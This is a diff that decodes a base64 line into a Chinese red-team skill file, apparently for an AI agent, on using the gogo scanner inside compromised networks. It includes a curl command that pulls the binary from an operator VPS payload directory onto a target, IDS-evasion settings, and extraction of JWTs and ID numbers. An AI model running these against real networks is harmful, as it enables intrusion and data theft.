@@ -1,1 +1,236 @@
-LS0tCm5hbWU6IGdvZ28taW50cmFuZXQKZGVzY3JpcHRpb246IGdvZ28gdjIuMTUuMCDpq5jmgKfog73lhoXnvZHmiavmj4/lvJXmk47vvJrmmbrog70v6LaF5pm66IO95qih5byP44CB5Li75YqoK+iiq+WKqOaMh+e6ueOAgeWFs+mUruS/oeaBr+aPkOWPlu+8iHRpdGxlL2NlcnQvSldUL+mCrueusS/ouqvku73or4HvvInjgIFudWNsZWkg5qih5p2/IFBPQ+OAgeWPkeWMheWPr+aOp+S9juWZquWjsAp3aGVuVG9Vc2U6IOi/m+WFpeWGhee9keWQjuWvueWkp+e9keaute+8iC8xNiAvMTLvvInlv6vpgJ/mtYvnu5jjgIHopoHmjIfnurnkuI7lhbPplK7kv6Hmga/jgIHpnIDopoHlsL3ph4/lsJHlj5HljIXkuI3ooqvlj5HnjrAKcm9sZTogaW50ZXJuYWwKZW5hYmxlZDogdHJ1ZQotLS0KCiMgZ29nb++8iOWGhee9kea1i+e7mOS4juaMh+e6ueW8leaTju+8iQoKYGdvZ29gID0gKirpq5jlubblj5HjgIHkvY7lmarlo7DjgIHpq5jluqblj6/phY3nva7nmoTmtYvnu5jlvJXmk44qKuOAgumTvuW8j+WPjeW6lOWHuuWTge+8jOS4k+S4uue6oumYn+WGhee9keWcuuaZr+iuvuiuoe+8mgrmnIDlsI/lj5HljIXljp/liJnjgIHkuLvliqgr6KKr5Yqo5oyH57q544CB5YWz6ZSu5L+h5oGv5o+Q5Y+W44CB5YaF5qC457qnIFBPQyDlvJXmk47vvIhuZXV0cm9u77yM5YW85a65IG51Y2xlaSDmqKHmnb/vvInjgIEK5pSv5oyBIERTTC93b3JrZmxvdyDoh6rlrprkuYnjgIIqKuWFiCBnb2dvIOmTuumdou+8jOWGjSBmc2NhbiDmiZPngrnjgIIqKgoKIyMg5LiOIGZzY2FuIOeahOWIhuW3pQoKfCB8IGdvZ28gfCBmc2NhbiB8CnwgLS0tIHwgLS0tIHwgLS0tIHwKfCDlvLrpobkgfCDlpKfnvZHmrrXmtYvnu5jjgIHmjIfnurnjgIHkv6Hmga/mj5Dlj5bjgIHlj6/mjqflj5HljIUgfCDlvLHlj6Pku6TniIbnoLTjgIHmnKrmjojmnYPjgIHpq5jljbHmvI/mtJ7jgIHliKnnlKggfAp8IOm7mOiupOWZquWjsCB8IOS9ju+8iGAtLW9wc2VjYOOAgee6v+eoiy/otoXml7blj6/osIPvvIkgfCDpq5jvvIg2MDAg57q/56iLICsg54iG56C0ICsgUE9DIOWFqOW8gO+8iSB8Cnwg6L6T5Ye6IHwgYC5kYXRg77yIZGVmbGF0ZSBKU09OIExpbmVz77yJKyDmoLzlvI/ljJYgfCB0eHQvanNvbi9jc3YgfAp8IOWFuOWei+eUqOazlSB8IGBnb2dvIC1pIDEwLjAuMC4wLzggLW0gc3MgLS1waW5nIC1wIHRvcDIsd2luLGRiIC0tYWZgIHwgYGZzY2FuIC1oIDEwLjAuMC4wLzI0IC1ub2JyIC1ub3BvY2AgfAoKIyMg5LqM6L+b5Yi2CgpgYGAK5pys5py6IDogJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9nb2dvL2dvZ28gICAgICAgICAgICAgICAg77yIdjIuMTUuMO+8jDQuM01C77yM6Ieq5bimIDMxMzgg5p2h5oyH57q577yJCiAgICAgICAkRFNIX0hPTUUvcmVkdGVhbS90b29sa2l0L2dvZ28vZ29nb193aW5kb3dzX2FtZDY0LmV4ZQogICAgICAgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9nb2dvL2dvZ29fbGludXhfYXJtNjQKVlBTICA6IGh0dHA6Ly885L2g55qEVlBTX0lQPjo5MTAwL2dvZ28gICAgICAgICAgICAgICAgICAgICAgICAgIO+8iOaKgOiDvSB2cHMtcmV2ZXJzZS1zaGVsbCDnmoTovb3ojbfnm67lvZXvvIkK5paH5qGjIDogaHR0cHM6Ly9jaGFpbnJlYWN0b3JzLmdpdGh1Yi5pby93aWtpL2dvZ28vCuaooeadvyA6IGh0dHBzOi8vZ2l0aHViLmNvbS9jaGFpbnJlYWN0b3JzL3RlbXBsYXRlcwoKIyDot7PliLDot7Pmnb/mnLov55uu5qCH5LiK5omn6KGMCmN1cmwgLW8gZ29nbyBodHRwOi8vPOS9oOeahFZQU19JUD46OTEwMC9nb2dvICYmIGNobW9kICt4IGdvZ28KYGBgCgrlronoo4XohJrmnKzkuI3kuIvovb0gZ29nb++8jOmcgOiHquihjOaUvuWIsOS4u+aWh+S7tui3r+W+hOOAgldpbmRvd3Mg5LiOIEFSTSDmlofku7blkIzmoLfopoHoh6rlt7HooaXvvJvlvZPliY3lubPlj7Dlj6rnlKjkuIrpnaLnmoTkuLvmlofku7bjgIIKCioq6Zu25L6d6LWWKirvvJrljZXkuKrpnZnmgIHkuozov5vliLbvvIzmjIfnurnkuI7mj5Dlj5bop4TliJnlhajpg6jlhoXnva7vvIxXaW5kb3dzIDIwMDMg6YO96IO96LeR44CCKirkuI3pnIDopoEqKumineWklumFjee9ruaWh+S7tuOAggoKIyMg57qq5b6LCgoxLiAqKuiMg+WbtCoq77yaYC0tZXhjbHVkZWAgLyBgLS1leGNsdWRlLWZpbGVgIOaOkumZpOaOiOadg+iMg+WbtOWklue9keaute+8jOWIq+aKiuWKnuWFrOe9keWSjOS6keWFg+aVsOaNruauteaJq+S6huOAggoyLiAqKuWFiOaOoui3r+WGjeaJq+aPjyoq77yaYGlwIGE7IGlwIHJvdXRlOyBhcnAgLWE7IGNhdCAvZXRjL2hvc3RzYCDigJTigJQg5YaF572R5ouT5omR5b6A5b6A6IO955yB5o6J5LiA5Y2K5omr5o+P44CCCjMuICoqT1BTRUMqKu+8muaVj+aEn+eOr+Wig+WKoCBgLS1vcHNlY2DvvIznur/nqIvljovliLAgYC10IDIwMH41MDBg77yM6LaF5pe2IGAtZCAzYO+8m+Wkp+e9keauteW/hemhuyBgLS1waW5nYCDlhYjov4fmu6TjgIIKNC4gKirkuI3opoEgYC1wIC1g77yI5YWo56uv5Y+j77yJ5omr5aSn572R5q61KirvvIzpgqPmmK/oh6rmnYDlvI/lj5HljIXvvJvlhYggYHRvcDJgIOWGjeWvueWtmOa0u+S4u+acuuS4iuWFqOerr+WPo+OAggoKIyMg5qC45b+D5qaC5b+1CgojIyMg56uv5Y+j6aKE6K6+77yI6L+Z5bel5YW355qE54G16a2C77yJCgpgYGBiYXNoCmdvZ28gLVAgcG9ydCAgICAgICAgIyDliJflh7rlhajpg6jpooTorr4gdGFnIOS4juWvueW6lOerr+WPowpgYGAKCuW4uOeUqCB0YWfvvJpgdG9wMWAoODAsNDQzLDgwODApIMK3IGB0b3AyYCjmlbDnmb7kuKrluLjop4EgV2ViL+acjeWKoeerr+WPoykgwrcgYHRvcDNgIMK3IGBjb21tb25gKOWGhee9keW4uOeUqCkgwrcKYHdpbmAoMTM1LDEzNyw0NDUsMzM4OSx3aW5ybSxveGlkKSDCtyBgZGJgIMK3IGBodHRwYCDCtyBgZG9ja2VyYCDCtyBgb3JhY2xlYCDCtyBgc21iYCDCtyBgYWxsYCjlhajpm4YpCgpgYGBiYXNoCnAg57uE5ZCI77yaLXAgdG9wMix3aW4sZGIgICAgICAgICAgIyDpgJflj7fku7vmhI/nu4TlkIgKcCDojIPlm7TvvJotcCAxLTEwMDAgICAgICAgICAgICAgICAjIOWMuumXtApwIOWFqOmDqO+8mi1wIC0gICAgICAgICAgICAgICAgICAgICMg562J5LqOIDEtNjU1MzXvvIjmhY7nlKjvvIkKcCDljZXngrnvvJotcCA2Mzc5LG15c3FsLDEyMzQ1CmBgYAoKIyMjIOS4ieenjeaJq+aPj+aooeW8jwoKfCDmqKHlvI8gfCDlj4LmlbAgfCDpgILnlKggfAp8IC0tLSB8IC0tLSB8IC0tLSB8CnwgZGVmYXVsdCB8IO+8iOm7mOiupO+8iSB8IOWNlSBJUCAvIOWwj+e9keaute+8iC8yNCDku6XlhoXvvIkgfAp8IHNtYXJ0IHwgYC1tIHNgIHwgLzI0fi8xNu+8jEFCIOauteaOoua1iyArIOWQr+WPkeW8j+WPkeaVoyB8Cnwgc3VwZXJzbWFydCB8IGAtbSBzc2AgfCAvMTYg5Lul5LiK5aSn5YaF572R77yM5YWI5o6i54K55YaN562b6YCJ572R5q61IHwKfCBzYyB8IGAtbSBzY2AgfCDlt7Lnn6Xnm67moIfmrrXjgIHopoHmm7Tnu4bnmoTnq6/lj6Popobnm5YgfAoKYGBgYmFzaApnb2dvIC1pIDE5Mi4xNjguMS4wLzI0IC1tIHMgIC0tcGluZyAtcCB0b3AyLHdpbixkYiAtLWFmCmdvZ28gLWkgMTAuMC4wLjAvOCAgICAtbSBzcyAtLXBpbmcgLXAgdG9wMix3aW4sZGIgLS1hZgpgYGAKCiMjIyB3b3JrZmxvd++8iOaKiuWkjeadguWRveS7pOWtmOaIkOmihOiuvu+8iQoKYGBgYmFzaApnb2dvIC1QIHdvcmtmbG93ICAgICAjIOWIl+WHuuWFqOmDqCB3b3JrZmxvdwpnb2dvIC13IDEwICAgICAgICAgICAjIOetieS7t+S6juaJqyAxMC4wLjAuMC84IOeahCBzdXBlcnNtYXJ0IOWFqOa1geeoi++8iGFsbCDnq6/lj6PvvIkKZ29nbyAtdyAxNzIgICAgICAgICAgIyAxNzIuMTYuMC4wLzEyCmdvZ28gLXcgMTkyICAgICAgICAgICMgMTkyLjE2OC4wLjAvMTYKZ29nbyAtdyBpbnRlcmMgICAgICAgIyDlhoXnvZHluLjop4EgQyDmrrXvvIgxMC8xNzIvMTkyIOS4ieaute+8iQpnb2dvIC13IDEwIC1pIDExLjAuMC4wLzggLXAgdG9wMiAgICMg5ZG95Luk6KGM5Y+v6KaG55uWIHdvcmtmbG93IOWPguaVsApgYGAKCiMjIOWPguaVsOmAn+afpe+8iOWunua1iyB2Mi4xNS4wIGAtaGDvvIkKCj4gKirlpJrlrZfnrKbplb/lj4LmlbDlv4Xpobvlj4zmqKrnur8qKu+8mmAtLWlwcGDjgIFgLS1zcGDjgIFgLS1lZmDjgIFgLS1hZmDjgILljZXmqKrnur/lj6rnu5kgYC1pLy1wLy1tLy10Ly1kLy1lLy12Ly13Ly1GLy1sLy1MLy1qYCDov5nnsbvljZXlrZfnrKbjgIIKCioq6L6T5YWlKioKYGBgCi1pLy0taXAgICAxOTIuMTY4LjEuMS8yNCwxNzIuMTYuMS4xLzI0ICAg55uu5qCH77yM6YCX5Y+35YiG6ZqU5aSa5LiqCi0tZXhjbHVkZSAxMC4wLjAuMS8yNCAgICAgICAgLS1leGNsdWRlLWZpbGUgPGZpbGU+Ci1sIDxmaWxlPiDnm67moIfliJfooajmlofku7YgICAgICAgIC1MICDku44gc3RkaW4g6K+755uu5qCHCi1qIDxmaWxlPiDlpI3nlKjkuIrmrKHnu5PmnpwoLmRhdCnmiJYgaXA6cG9ydCDliJfooajvvIznu6fnu63mt7HmjJYgICAgIC1KICDku44gc3RkaW4g6K+7CmBgYAoKKirovpPlh7oqKgpgYGAKLWYgPGZpbGU+ICAgICAgICDovpPlh7rmlofku7blkI0gICAgICAgICAtLXBhdGggIOi+k+WHuuebruW9lQotbyA8Zm10PiAgICAgICAgIOWRveS7pOihjOi+k+WHuuagvOW8jyAgICAgLU8gPGZtdD4gIOaWh+S7tui+k+WHuuagvOW8j++8iOm7mOiupCBqc29ubGluZXPvvIkKLS1hZiAgICAgICAgICAgICDoh6rliqjlkb3lkI3ovpPlh7rmlofku7bvvIguZGF077yMZGVmbGF0ZSBKU09OIExpbmVz77yJCi0taGYgICAgICAgICAgICAg6Ieq5Yqo5ZG95ZCN6ZqQ6JeP5paH5Lu2ICAgLUMgIOWFs+mXreWOi+e8qSAgICAgIC0tdGVlICDlkIzml7bkv53nlZnmjqfliLblj7DovpPlh7oKLXEvLS1xdWlldCAgICAgICDlhbPml6Xlv5flj6rnlZnnu5PmnpzvvIjogZTliqjlhbbku5blt6Xlhbflv4XliqDvvIkKLUYgPGZpbGU+ICAgICAgICDmoLzlvI/ljJblt7LmnIkgLmRhdCDnu5PmnpwKLS1maWx0ZXIgLyAtLW91dHB1dC1maWx0ZXIgLyAtLXNjYW4tZmlsdGVyICAg5Y6G5Y+y6L+H5rukIC8g5a6e5pe26L+H5rukIC8g5o+Q5YmN5YGc5q2iCmBgYAoKKirmmbrog73miavmj48qKgpgYGAKLW0vLS1tb2QgIGRlZmF1bHR8c3xzc3xzYyAgICDmiavmj4/mqKHlvI8KLS1waW5nICAgICAgICAgICAgICAgICAgICAgICDlhYggSUNNUCDov4fmu6TvvIjlpKfnvZHmrrXlv4XpobvvvIkKLW4vLS1ubyAgICAgICAgICAgICAgICAgICAgICDlj6rlgZrmmbrog73miavmj4/vvIzkuI3ov5vlhaXpu5jorqTmiavmj48KLS1zcCAgIHNtYXJ0IOerr+WPo+aOoumSiO+8iOm7mOiupCA4MO+8jHNzIOaooeW8j+m7mOiupCBpY21w77yJCi0taXBwICBBQiDmrrUgSVAg5o6i6ZKI77yI6buY6K6kIDEsMjU077yJCmBgYAoKKirmgKfog73kuI7pmpDolL0qKgpgYGAKLXQvLS10aHJlYWQgPG4+ICAgICDlubblj5HvvIhsaW51eCDpu5jorqQgNDAwMO+8jOWGhee9keW7uuiuriAyMDB+MTAwMO+8iQotZC8tLXRpbWVvdXQgPOenkj4gICDotoXml7bvvIjpu5jorqQgMu+8iQotRC8tLXNzbC10aW1lb3V0ICAgICBTU0wg6LaF5pe2Ci0tb3BzZWMgICAgICAgICAgICAg5L2O5Zmq5aOw5qih5byP77yI5pWP5oSf546v5aKD5byA77yJCi1zLy0tc3ByYXkgICAgICAgICAg56uv5Y+j5LyY5YWI5Za35rSS77yI56uv5Y+j5pWwID41MDAg6Ieq5Yqo5ZCv55So77yJCi0tbm8tc3ByYXkgICAgICAgICAg5by65Yi25YWz6Zet5Za35rSSCmBgYAoKKirmjIfnurnkuI7mj5Dlj5YqKgpgYGAKLXYvLS12ZXJib3NlICAgICAgICAg5Li75Yqo5oyH57q56K+G5Yir77yI5LiN5Y+R6L+Z5Liq5Y+q5pyJ6KKr5Yqo5oyH57q577yM5L+h5oGv5bCR5L2G5a6J6Z2Z77yJCi0tZmYgPGZpbGU+ICAgICAgICAgIOiHquWumuS5ieaMh+e6ueW6kwotLWV4dHJhY3QgIjxyZWdleD4iICDoh6rlrprkuYnmj5Dlj5bmraPliJkKZ29nbyAtUCBleHRyYWN0ICAgICAg5p+l55yL5YaF572u5o+Q5Y+W6KeE5YiZ77yIand0IC8gbWFpbCAvIGlkY2FyZCAvIHBob25lIC8gaXAg562J77yJCmBgYAoKKirmvI/mtJ7vvIhuZXV0cm9uIOWGheaguO+8iSoqCmBgYAotZS8tLWV4cGxvaXQgICAgICAgICDlvIDlkK8gUE9DIOaJq+aPj++8iOS4jiAtdiDlkIjnlKjlhpnkvZwgLWV277yJCi1FIDxuYW1lPiAgICAgICAgICAgIOaMh+Wumuaooeadv+WQjSAgICAgICAgLS1lZiA8ZmlsZT4gIOaMh+Wumuaooeadv+aWh+S7tgotLXBheWxvYWQgPHM+ICAgICAgICDmjIflrpogcGF5bG9hZCAgICAgIC0tYXR0YWNrLXR5cGUgc25pcGVyfGNsdXN0ZXJib21ifHBpdGNoZm9yawpgYGAKCioq5Luj55CGKioKYGBgCi0tcHJveHkgc29ja3M1Oi8vMTI3LjAuMC4xOjExMTExICAgICAgIyDlrp7mtYvlj6/nlKjvvIzotbAgc3VvNSAvIHNzaCAtRCDpmqfpgZMKYGBgCgojIyDmoIflh4bkvZzkuJrmtYHnqIvvvIhTT1DvvIkKCmBgYGJhc2gKIyAwKSDmjqLot68KaXAgYTsgaXAgcm91dGU7IGFycCAtYTsgY2F0IC9ldGMvaG9zdHMgL2V0Yy9yZXNvbHYuY29uZgoKIyAxKSDlpKfnvZHmrrXmtYvnu5jvvIjlronpnZnjgIHlhYjmjqLmtLvjgIHnu5PmnpzokL3mlofku7bvvIkKLi9nb2dvIC1pIDEwLjAuMC4wLzE2IC1tIHNzIC0tcGluZyAtcCB0b3AyLHdpbixkYiAtLWFmIC10IDUwMCAtZCAzCgojIDIpIOeci+e7k+aenO+8iGh1bWFuLWxpa2XvvIkKLi9nb2dvIC1GIC4vLjEwLjAuMC4wXzE2X3RvcDJfd2luX2RiX3NzX2RhdAoKIyAzKSDlr7nlrZjmtLvkuLvmnLrkuIrlhajnq6/lj6MgKyDkuLvliqjmjIfnurkKLi9nb2dvIC1pIDEwLjAuMS4wLzI0IC1wIC0gLXYgLXQgMTAwMCAtZCAzIC0tYWYKCiMgNCkg5a6a5ZCR5omTIFBPQ++8iOWPquWvueehruiupOacieaMh+e6ueeahOebruagh++8iQouL2dvZ28gLWkgMTAuMC4xLjUsMTAuMC4xLjkgLXAgdG9wMiAtZXYgLUUgPOaooeadv+WQjT4KCiMgNSkg5aSN55So5LiK5LiA5q2l57uT5p6c57un57ut5rex5oyW77yI5LiN55So6YeN5omr77yJCi4vZ29nbyAtaiAuL3N0ZXAxLmRhdCAtcCAxLTY1NTM1IC12IC1lCmBgYAoKIyMjIOi1sOmap+mBk+a1i+e7mO+8iOWGhee9kea4l+mAj+S4u+i3r+W+hO+8iQoKYGBgYmFzaAojIOWJjeaPkO+8muaKgOiDvSBzdW81LXR1bm5lbCDlu7rlpb0gc29ja3M177yM5oiWIHZwcy1yZXZlcnNlLXNoZWxsIOmHjCBzc2ggLUQKLi9nb2dvIC1pIDEwLjAuMC4wLzE2IC1tIHNzIC0tcGluZyAtcCB0b3AyLHdpbixkYiAtLWFmIFwKICAgICAgIC0tcHJveHkgc29ja3M1Oi8vMTI3LjAuMC4xOjEwODAgLXQgMzAwIC1kIDUgLXEKCiMg5a6e5rWL77yaZ29nbyAtLXByb3h5IHNvY2tzNTovLyDkvJrmiormtYHph4/nnJ/mraPpgIHov5vpmqfpgZPvvIjnu48gVlBTIOaJq+WIsOeahOaYryBWUFMg55qEIFNTSCDmjIfnurnvvIkKYGBgCgrpmqfpgZPlnLrmma/mioogYC10YCDpmY3liLAgMzAwIOS7peWGheOAgWAtZGAg5o+Q5YiwIDXvvIzlkKbliJnpmqfpgZPkvJrkuKLljIXor6/liKTjgIIKCiMjIOe7k+aenOiQveW6k++8iOW/hemhu+WBmu+8iQoKZ29nbyDnmoQgYC5kYXRgIOaYr+WOi+e8qSBKU09OIExpbmVz77yM5YWI5qC85byP5YyW5YaN6Kej5p6Q5YWl5bqT77yaCgpgYGBiYXNoCi4vZ29nbyAtRiAuL3Jlc3VsdC5kYXQgLW8ganNvbiAtZiByZXN1bHQuanNvbiAgICAgICMg6L2s5oiQIEpTT07vvIjlrp7mtYvkuqfniannu5PmnoTop4HkuIvvvIkKcHl0aG9uMyB0b29scy9wYXJzZS5weSByZXN1bHQuanNvbgojIOino+aekOimgeeCue+8mumhtuWxguaYryB7Y29uZmlnLCBpcCwgZGF0YTpbLi4uXX3vvIzmr4/mnaHlkKsgaXAvcG9ydC9wcm90b2NvbC9zdGF0dXMvZnJhbWV3b3Jrcy90aXRsZS90aW1pbmcKYGBgCmBgYHB5dGhvbgppbXBvcnQganNvbgpkID0ganNvbi5sb2FkKG9wZW4oJ3Jlc3VsdC5qc29uJywgZW5jb2Rpbmc9J3V0Zi04JykpCmZvciBpdCBpbiBkLmdldCgnZGF0YScsIFtdKToKICAgIGZ3ID0gJywnLmpvaW4oKGl0LmdldCgnZnJhbWV3b3JrcycpIG9yIHt9KS5rZXlzKCkpCiAgICBwcmludChpdC5nZXQoJ2lwJyksIGl0LmdldCgncG9ydCcpLCBpdC5nZXQoJ3Byb3RvY29sJyksIGZ3LCBpdC5nZXQoJ3RpdGxlJykpCiMg5a6e5rWL5Y2V5p2h77yaeyJpcCI6IjEwLjAuMC41IiwicG9ydCI6IjIyIiwicHJvdG9jb2wiOiJ0Y3AiLCJzdGF0dXMiOiJvcGVuIiwKIyAgICAgICAgICAgICAiZnJhbWV3b3JrcyI6eyJzc2giOnsibmFtZSI6InNzaCIsImF0dHJpYnV0ZXMiOnsidmVyc2lvbiI6IjEwLjNwMSJ9fX0sCiMgICAgICAgICAgICAgInRpdGxlIjoiU1NILTIuMC1PcGVuUyIsInRpbWluZyI6MjZ9CmBgYAoKYGBgYmFzaAojIOWFpeW6k+e6quW+i++8iOS4jiBmc2NhbiDnm7jlkIzvvIkKcmVkdGVhbV9hc3NldF9hZGQgICAgICB7IGVuZ2FnZW1lbnQsIGlwLCBwb3J0LCBzZXJ2aWNlLCB0aXRsZSwgc291cmNlOiAiZ29nbyIsIHRhZ3M6IFsuLi5dIH0KcmVkdGVhbV93ZWJfbGlzdCAgICAgICAjIOS5i+WQjueUsSB3ZWIg5oyH57q55oqA6IO96KGl5YWFIFVSTC/moIfpopgKcmVkdGVhbV92dWxuX2FkZCAgICAgICB7IGVuZ2FnZW1lbnQsIHRhcmdldCwgbmFtZSwgc2V2ZXJpdHksIGV2aWRlbmNlX3JlZiB9ICAgIyDlv4XpobvphY3or4Hmja4KYGBgCgoqKuazqOaEjyoq77yaZ29nbyDnmoTmoYbmnrYv5oyH57q557uT5p6c5YaZ6L+bIGBhc3NldGAg55qEIGBmaW5nZXJwcmludGAg5a2X5q6177yM5LiN6KaB5Y+q55WZ5Zyo57uI56uv6YeM44CCCuaJq+WIsOeahOaVj+aEn+S/oeaBr+aPkOWPlue7k+aenO+8iOmCrueusS/ouqvku73or4EvSldU77yJ5bGe5LqO44CM5aSn6YeP5pWP5oSf5L+h5oGv44CN5b6X5YiG54K577yM55SoIGByZWR0ZWFtX3Z1bG5fYWRkYCArCmByZWR0ZWFtX3Njb3JlX2hpdGAg6K6w5b2V77yM6K+B5o2u6JC9IGBydW5zL2DjgIIKCiMjIOaOkumanAoKfCDnjrDosaEgfCDlpITnkIYgfAp8IC0tLSB8IC0tLSB8Cnwg5Y+C5pWw5oql6ZSZIHwg6ZW/5Y+C5pWw55So5Y+M5qiq57q/77yIYC0tYWZgIOS4jeaYryBgLWFmYO+8ie+8jGAtUGAg5Y+q5o6l5Y+XIGBwb3J0L3dvcmtmbG93L25ldXRyb24vZXh0cmFjdGAgfAp8IOe7k+aenOaWh+S7tuaJvuS4jeWIsCB8IGAtLWFmYCDlhpnlnKgqKuS6jOi/m+WItuWQjOebruW9lSoq77yM5YqgIGAtLXBhdGhgIOaMh+WumuebruW9lSB8Cnwg5aSn572R5q615Yeg5LmO5rKh57uT5p6cIHwgYC0tcGluZ2Ag5Lya5ryP5o6J56aBIHBpbmcg5Li75py677yb5Y675o6JIGAtLXBpbmdgIOaIluaUuSBgLS1pcHBgIOiwg+aVtOaOoumSiCB8Cnwg5omr5o+P5aSq5oWiIHwg5o+Q6auYIGAtdGDjgIHpmY3kvY4gYC1kYO+8m2AtcGAg5o2i5oiQIGB0b3AxYC9gdG9wMmDvvJvlpKfnvZHmrrXnlKggYC1tIHNzYCB8Cnwg6KKrIElEUyDlj5HnjrAgfCBgLS1vcHNlY2AgKyBgLXQgMjAwYCArIGAtZCAzYO+8m+S4jeimgeW8gCBgLWVg77yb5LiN6KaBIGAtcCAtYCB8Cnwg6Zqn6YGT6YeM5aSn6YeP6LaF5pe2IHwg6ZmNIGAtdGDjgIHljYcgYC1kYO+8jOmap+mBk+W4puWuveaYr+eTtumiiCB8Cnwg5oOz5Y+q55yL57uT5p6c5LiN55yL5pel5b+XIHwgYC1xYO+8iOiBlOWKqOWFtuS7luW3peWFt+W/heWKoO+8iSB8CgojIyDnm7jlhbPmioDog70KCi0gYGZzY2FuLWludHJhbmV0YO+8mumTuumdouS5i+WQjueahOeIhuegtOS4juWIqeeUqAotIGBzdW81LXR1bm5lbGDvvJpXZWJTaGVsbCDihpIgU09DS1M177yM57uZIGdvZ28g5o+Q5L6bIGAtLXByb3h5YCDlhaXlj6MKLSBgdnBzLXJldmVyc2Utc2hlbGxg77ya6Zqn6YGT5LiO6L296I235oqV6YCSCi0gYHdlYi1maW5nZXJwcmludGAgLyBgYXNzZXQtY29ycmVsYXRpb25g77ya5oqKIGdvZ28g55qE57uT5p6c6L+b5LiA5q2l5YWz6IGU5oiQ6LWE5Lqn5Zu+6LCxCg==
+---
+name: gogo-intranet
+description: gogo v2.15.0 高性能内网扫描引擎：智能/超智能模式、主动+被动指纹、关键信息提取（title/cert/JWT/邮箱/身份证）、nuclei 模板 POC、发包可控低噪声
+whenToUse: 进入内网后对大网段（/16 /12）快速测绘、要指纹与关键信息、需要尽量少发包不被发现
+role: internal
+enabled: true
+---
+
+# gogo（内网测绘与指纹引擎）
+
+`gogo` = **高并发、低噪声、高度可配置的测绘引擎**。链式反应出品，专为红队内网场景设计：
+最小发包原则、主动+被动指纹、关键信息提取、内核级 POC 引擎（neutron，兼容 nuclei 模板）、
+支持 DSL/workflow 自定义。**先 gogo 铺面，再 fscan 打点。**
+
+## 与 fscan 的分工
+
+| | gogo | fscan |
+| --- | --- | --- |
+| 强项 | 大网段测绘、指纹、信息提取、可控发包 | 弱口令爆破、未授权、高危漏洞、利用 |
+| 默认噪声 | 低（`--opsec`、线程/超时可调） | 高（600 线程 + 爆破 + POC 全开） |
+| 输出 | `.dat`（deflate JSON Lines）+ 格式化 | txt/json/csv |
+| 典型用法 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |
+
+## 二进制
+
+```
+本机 : $DSH_HOME/redteam/toolkit/gogo/gogo                （v2.15.0，4.3MB，自带 3138 条指纹）
+       $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
+       $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
+VPS  : http://<你的VPS_IP>:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）
+文档 : https://chainreactors.github.io/wiki/gogo/
+模板 : https://github.com/chainreactors/templates
+
+# 跳到跳板机/目标上执行
+curl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo
+```
+
+安装脚本不下载 gogo，需自行放到主文件路径。Windows 与 ARM 文件同样要自己补；当前平台只用上面的主文件。
+
+**零依赖**：单个静态二进制，指纹与提取规则全部内置，Windows 2003 都能跑。**不需要**额外配置文件。
+
+## 纪律
+
+1. **范围**：`--exclude` / `--exclude-file` 排除授权范围外网段，别把办公网和云元数据段扫了。
+2. **先探路再扫描**：`ip a; ip route; arp -a; cat /etc/hosts` —— 内网拓扑往往能省掉一半扫描。
+3. **OPSEC**：敏感环境加 `--opsec`，线程压到 `-t 200~500`，超时 `-d 3`；大网段必须 `--ping` 先过滤。
+4. **不要 `-p -`（全端口）扫大网段**，那是自杀式发包；先 `top2` 再对存活主机上全端口。
+
+## 核心概念
+
+### 端口预设（这工具的灵魂）
+
+```bash
+gogo -P port        # 列出全部预设 tag 与对应端口
+```
+
+常用 tag：`top1`(80,443,8080) · `top2`(数百个常见 Web/服务端口) · `top3` · `common`(内网常用) ·
+`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(全集)
+
+```bash
+p 组合：-p top2,win,db          # 逗号任意组合
+p 范围：-p 1-1000               # 区间
+p 全部：-p -                    # 等于 1-65535（慎用）
+p 单点：-p 6379,mysql,12345
+```
+
+### 三种扫描模式
+
+| 模式 | 参数 | 适用 |
+| --- | --- | --- |
+| default | （默认） | 单 IP / 小网段（/24 以内） |
+| smart | `-m s` | /24~/16，AB 段探测 + 启发式发散 |
+| supersmart | `-m ss` | /16 以上大内网，先探点再筛选网段 |
+| sc | `-m sc` | 已知目标段、要更细的端口覆盖 |
+
+```bash
+gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
+gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
+```
+
+### workflow（把复杂命令存成预设）
+
+```bash
+gogo -P workflow     # 列出全部 workflow
+gogo -w 10           # 等价于扫 10.0.0.0/8 的 supersmart 全流程（all 端口）
+gogo -w 172          # 172.16.0.0/12
+gogo -w 192          # 192.168.0.0/16
+gogo -w interc       # 内网常见 C 段（10/172/192 三段）
+gogo -w 10 -i 11.0.0.0/8 -p top2   # 命令行可覆盖 workflow 参数
+```
+
+## 参数速查（实测 v2.15.0 `-h`）
+
+> **多字符长参数必须双横线**：`--ipp`、`--sp`、`--ef`、`--af`。单横线只给 `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j` 这类单字符。
+
+**输入**
+```
+-i/--ip   192.168.1.1/24,172.16.1.1/24   目标，逗号分隔多个
+--exclude 10.0.0.1/24        --exclude-file <file>
+-l <file> 目标列表文件        -L  从 stdin 读目标
+-j <file> 复用上次结果(.dat)或 ip:port 列表，继续深挖     -J  从 stdin 读
+```
+
+**输出**
+```
+-f <file>        输出文件名         --path  输出目录
+-o <fmt>         命令行输出格式     -O <fmt>  文件输出格式（默认 jsonlines）
+--af             自动命名输出文件（.dat，deflate JSON Lines）
+--hf             自动命名隐藏文件   -C  关闭压缩      --tee  同时保留控制台输出
+-q/--quiet       关日志只留结果（联动其他工具必加）
+-F <file>        格式化已有 .dat 结果
+--filter / --output-filter / --scan-filter   历史过滤 / 实时过滤 / 提前停止
+```
+
+**智能扫描**
+```
+-m/--mod  default|s|ss|sc    扫描模式
+--ping                       先 ICMP 过滤（大网段必须）
+-n/--no                      只做智能扫描，不进入默认扫描
+--sp   smart 端口探针（默认 80，ss 模式默认 icmp）
+--ipp  AB 段 IP 探针（默认 1,254）
+```
+
+**性能与隐蔽**
+```
+-t/--thread <n>     并发（linux 默认 4000，内网建议 200~1000）
+-d/--timeout <秒>   超时（默认 2）
+-D/--ssl-timeout     SSL 超时
+--opsec             低噪声模式（敏感环境开）
+-s/--spray          端口优先喷洒（端口数 >500 自动启用）
+--no-spray          强制关闭喷洒
+```
+
